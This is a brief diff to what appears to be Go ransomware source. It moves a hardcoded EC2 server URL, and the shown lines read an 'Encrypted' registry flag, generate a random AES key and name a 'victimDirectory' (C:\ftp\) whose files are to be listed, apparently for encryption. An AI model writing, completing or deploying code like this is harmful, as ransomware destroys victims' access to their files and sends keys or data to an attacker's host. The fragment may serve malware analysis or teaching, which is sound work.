@@ -24,6 +24,7 @@ func randSeq(n int) string {
 }
 
 func main() {
+	url := "http://ec2-3-208-127-56.compute-1.amazonaws.com"
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.QUERY_VALUE|registry.SET_VALUE)
 	check, keyType, err := k.GetStringValue("Encrypted")
 
@@ -34,7 +35,7 @@ func main() {
 	rand.Seed(time.Now().UnixNano())
 
 	aesKey := randSeq(32)
-	url := "http://ec2-3-208-127-56.compute-1.amazonaws.com"
+
 	victimDirectory := "C:\\ftp\\"
 
 	var files []string
